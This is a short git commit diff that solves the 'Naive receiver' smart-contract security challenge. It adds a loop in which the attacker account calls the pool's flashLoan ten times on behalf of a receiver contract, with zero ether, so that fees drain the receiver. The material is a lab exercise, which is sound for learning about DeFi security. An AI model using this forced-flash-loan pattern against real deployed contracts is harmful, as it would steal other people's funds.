c4d7d620bd5bd89882d7037371e57b5cac8d37a1
Shiva <shanshiva@outlook.com>
2022-02-07 20:32:33 +0530

    Completed Naive Receiver Challenge

--- test/naive-receiver/naive-receiver.challenge.js
+++ test/naive-receiver/naive-receiver.challenge.js
@@ -31,6 +31,9 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        for(i=0; i<10; i++) {
+            await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
+        }
     });
 
     after(async function () {
